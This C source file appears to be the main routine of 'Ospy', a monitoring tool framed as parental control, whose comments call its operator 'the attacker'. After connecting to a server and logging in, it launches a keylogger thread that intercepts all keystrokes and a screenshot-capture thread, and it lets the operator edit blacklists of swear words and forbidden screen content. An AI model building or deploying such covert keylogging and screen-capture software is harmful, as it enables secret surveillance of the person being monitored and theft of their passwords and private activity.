#include <pthread.h> 
#include <signal.h>
#include <string.h>
#include <stdbool.h>
#include "keystrokes_analyst.h"
#include "screen_analyst.h"
#include "data_analyzer.h"
#include "connection.h"
#include "entering_to_kidO.h"
#include "utilities.h"

char ** swear_words_array;
char ** forbidden_screen_contents_array;
volatile int num_of_swear_words = 0;
char ** forbidden_screen_contents_array;
volatile int num_of_forbidden_screen_contents = 0;

void * start_capture_screenshots();
void start_connection();

int main (){
	start_connection();
	
	pthread_t screen_analyzer_thread;
	pthread_t keyloger_log_thread;
	
	action_type attacker_income_action;
	main_data temp_data;
	int user_input;
	bool left_welcome_page = false;
	char added_word[MAX_FORBIDDEN_WORD_LEN];
	secure_key_exchange();
	// welcome page - entering the attacker to Ospy
	do { 
		print_large_banner();
		print_entering_menu();
	
		printf("\033[35;1m-> \033[0m");
		flush_stdin();
		user_input = getchar();
		
		switch(user_input) {
			case '1':
				if(log_in() == ENTERING_ACTION_SUCCESS)
					left_welcome_page = true;
				
				break;
				
			case '2':
				register_parent();
				
				break;
				
			default:
				printf("\n[\033[31;1m-\033[0m] \033[31;1mInvalid input\033[0m\n");
				sleep(1);
				
				break;
		}
	} while (!left_welcome_page); // exit from the loop/welcome page if the user logged in successfully

	swear_words_array = load_file_to_array(SWEAR_WORDS_FILE_NAME, &num_of_swear_words);
	forbidden_screen_contents_array = load_file_to_array(FORBIDDEN_SCREEN_CONTENTS_FILE_NAME, &num_of_forbidden_screen_contents);
		
	pthread_create(&keyloger_log_thread, NULL, start_keystrokes_analyst, NULL); // start the keylogger to intercept all keystrokes
	pthread_create(&screen_analyzer_thread, NULL, start_capture_screenshots, NULL);
	
	while (true){
		print_adding_menu();
		printf("\033[35;1m-> \033[0m");
		flush_stdin();
		user_input = getchar();
		printf("Enter a word : ");
		safe_scan(&added_word, MAX_FORBIDDEN_WORD_LEN);
		switch(user_input) {
			case '1':
				add_to_blacklist(added_word, SWEAR_WORDS_FILE_NAME);
				swear_words_array = load_file_to_array(SWEAR_WORDS_FILE_NAME, &num_of_swear_words);
				break;
			
			case '2':
				add_to_blacklist(added_word, FORBIDDEN_SCREEN_CONTENTS_FILE_NAME);
				forbidden_screen_contents_array = load_file_to_array(FORBIDDEN_SCREEN_CONTENTS_FILE_NAME, &num_of_forbidden_screen_contents);
				break;
			
			default :
				
				break;
		}
		system("clear");
	}
}

void start_connection(){
	while (create_connection() == FAILUR){
		printf("[-] connection failed, trying to connect again ...\n"); // delete ita
		sleep(3);
	}
}
